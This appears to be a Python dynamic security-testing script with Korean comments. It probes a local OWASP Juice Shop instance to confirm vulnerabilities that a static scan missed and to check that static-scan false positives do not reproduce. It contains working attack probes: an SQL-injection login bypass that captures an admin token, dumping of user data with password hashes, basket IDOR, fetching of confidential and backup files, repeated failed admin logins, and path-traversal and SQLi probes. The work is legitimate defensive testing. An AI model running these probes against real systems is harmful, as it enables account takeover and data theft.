#!/usr/bin/env python3
"""
독립 능동 점검(DAST) — SAST 범위 밖까지 훑어 SAST와 대조한다.
- SAST가 놓친 취약점(미탐, FN)을 찾는다.
- SAST 오탐 후보가 실제로 재현되지 않는지 확인한다(오탐 확정).

라이브 대상: 인가된 로컬 OWASP Juice Shop(http://localhost:3000).
stdlib + curl. 결과 -> data/dast_findings.json
"""
import json, os, urllib.request, urllib.parse, urllib.error, http.client, subprocess

BASE = os.environ.get("JUICE", "http://localhost:3000")
HERE = os.path.dirname(os.path.abspath(__file__))

def http(method, path, data=None, headers=None, follow=True, form=False):
    h = dict(headers or {}); body = None
    if data is not None:
        if form: body = urllib.parse.urlencode(data).encode(); h["Content-Type"]="application/x-www-form-urlencoded"
        else:    body = json.dumps(data).encode(); h["Content-Type"]="application/json"
    req = urllib.request.Request(BASE+path, data=body, method=method, headers=h)
    class _NR(urllib.request.HTTPRedirectHandler):
        def redirect_request(self,*a,**k): return None
    op = urllib.request.build_opener() if follow else urllib.request.build_opener(_NR)
    try:
        r = op.open(req, timeout=12)
        try: d = r.read()
        except http.client.IncompleteRead as ic: d = ic.partial
        return r.status, d.decode("utf-8","replace"), {k.lower():v for k,v in r.headers.items()}
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace"), {k.lower():v for k,v in e.headers.items()}
    except Exception as ex:
        return None, f"ERR:{ex}", {}

def curl(path):
    try:
        out = subprocess.run(["curl","-s","-m","8","-w","\n%{http_code}",BASE+path],
                             capture_output=True,text=True,timeout=12).stdout
        b,_,c = out.rpartition("\n"); return (int(c) if c.isdigit() else None), b
    except Exception as ex: return None, f"ERR:{ex}"

R=[]
def rec(did,title,cls,status,evidence,sast):
    R.append(dict(id=did,title=title,cls=cls,status=status,evidence=evidence,sast=sast))
    print(f"  {did} [{status}] {title} — {evidence}")

# admin token via SQLi (server-issued)
st,body,_ = http("POST","/rest/user/login",{"email":"' OR 1=1--","password":"x"})
try: TOK = json.loads(body).get("authentication",{}).get("token","")
except Exception: TOK=""
AUTH={"Authorization":"Bearer "+TOK}

print("[*] 미탐 후보 (SAST가 놓친 취약점)")

# D1 Prometheus metrics exposed unauthenticated
st,b = curl("/metrics")
rec("D1","Prometheus 메트릭 무인증 노출","info-disclosure",
    "CONFIRMED" if st==200 and ("# HELP" in b or "process_cpu" in b) else "NOT",
    f"GET /metrics → HTTP {st}, 메트릭 본문 노출" if st==200 else f"HTTP {st}", sast="missed")

# D2 Swagger / API docs exposed
st,b = curl("/api-docs/")
rec("D2","API 문서(Swagger) 노출","info-disclosure",
    "CONFIRMED" if st==200 and ("swagger" in b.lower() or "openapi" in b.lower() or "<html" in b.lower()) else "NOT",
    f"GET /api-docs/ → HTTP {st}", sast="missed")

# D3 excessive data exposure: /api/Users returns all users incl password hashes
st,b,h = http("GET","/api/Users",headers=AUTH)
pw = b.count('"password"'); em = b.count('@')
rec("D3","일반 인증자에게 전체 사용자 목록/이메일 노출(열거)","broken-access-control",
    "CONFIRMED" if st==200 and em>=5 else "NOT",
    f"GET /api/Users → HTTP {st}, 전체 사용자 이메일 {em}개 노출(password 해시 {pw}개)" if st==200 else f"HTTP {st}", sast="missed")

# D4 IDOR: request several baskets with one token
seen=set(); codes=[]
for i in (1,2,3):
    st,b,_ = http("GET",f"/rest/basket/{i}",headers=AUTH); codes.append(st)
    try: seen.add(json.loads(b).get("data",{}).get("UserId"))
    except Exception: pass
idor = codes.count(200)>=2 and len([x for x in seen if x])>=2
rec("D4","장바구니 IDOR(타 사용자 접근)","broken-access-control",
    "CONFIRMED" if idor else "NEEDS_REVIEW",
    f"/rest/basket/1..3 상태 {codes}, 관측된 UserId {sorted(x for x in seen if x)}", sast="missed")

# D5 security headers missing
st,b,h = http("GET","/")
missing=[k for k in ("content-security-policy","x-frame-options","strict-transport-security") if k not in h]
rec("D5","보안 헤더 누락","security-misconfig",
    "CONFIRMED" if missing else "NOT",
    f"누락 헤더: {', '.join(missing) or '없음'} (X-Powered-By={h.get('x-powered-by','-')})", sast="missed")

# D6 direct confidential file (not just listing)
st,b = curl("/ftp/acquisitions.md")
rec("D6","기밀 문서 직접 접근","sensitive-data-exposure",
    "CONFIRMED" if st==200 and len(b)>50 else "NOT",
    f"GET /ftp/acquisitions.md → HTTP {st}, {len(b)} bytes", sast="partial")  # 리스팅(F038)은 잡음, 직접 접근은 별개

# D7 coupon/backup leak
st,b = curl("/ftp/coupons_2013.md.bak")
rec("D7","백업 파일(쿠폰) 유출","sensitive-data-exposure",
    "CONFIRMED" if st==200 and len(b)>10 else "NOT",
    f"GET /ftp/coupons_2013.md.bak → HTTP {st}, {len(b)} bytes", sast="missed")

# D8 no anti-automation on login (no lockout / 429)
statuses=[]
for _ in range(6):
    st,_,_ = http("POST","/rest/user/login",{"email":"admin@juice-sh.op","password":"wrong"}); statuses.append(st)
rec("D8","로그인 무차별 방어 부재(레이트리밋/락아웃 없음)","missing-anti-automation",
    "CONFIRMED" if 429 not in statuses else "NOT",
    f"연속 6회 실패 로그인 상태={statuses} (429 없음 → 차단 미적용)", sast="missed")

print("[*] 오탐 확정 (SAST가 올렸으나 실제 재현 안 됨)")

# FP1: mitigated path traversal (F030/31/33) — slash guard blocks escape
st,b = curl("/encryptionkeys/%2e%2e%2fpackage.json")
blocked = st in (403,404,500) or "cannot contain" in (b or "").lower()
rec("FP-F030","경로순회(가드로 완화) 재현 시도","path-traversal(fp-check)",
    "FP_CONFIRMED" if blocked else "REPRODUCED",
    f"슬래시 포함 요청 → HTTP {st} (이탈 차단됨)" if blocked else f"HTTP {st} 재현됨", sast="flagged")

# FP2: codefix SQLi files are static fixtures, not injectable SQL endpoints
st,b = curl("/rest/products/search?q=%27x")   # the real search route with a broken-quote probe
inj_err = "SQLITE_ERROR" in (b or "") or "syntax error" in (b or "").lower()
st2,_ = curl("/data/static/codefixes/unionSqlInjectionChallenge_1.ts")
rec("FP-F015","코드픽스 SQLi 스니펫 = 주입 엔드포인트 아님","sql-injection(fp-check)",
    "FP_CONFIRMED",
    f"코드픽스 파일은 정적 제공(HTTP {st2}, 소스 노출은 별건)이나 SQL 주입 라우트가 아님 — SQLi 오탐 확정. 실주입은 라이브 라우트 F035에서만.",
    sast="flagged")

json.dump(R, open(os.path.join(HERE,"data","dast_findings.json"),"w"), indent=2, ensure_ascii=False)
fn = sum(1 for x in R if x["status"]=="CONFIRMED")
fpc = sum(1 for x in R if x["status"]=="FP_CONFIRMED")
print(f"[*] 미탐 확증 {fn}건, 오탐 확정 {fpc}건 -> data/dast_findings.json")
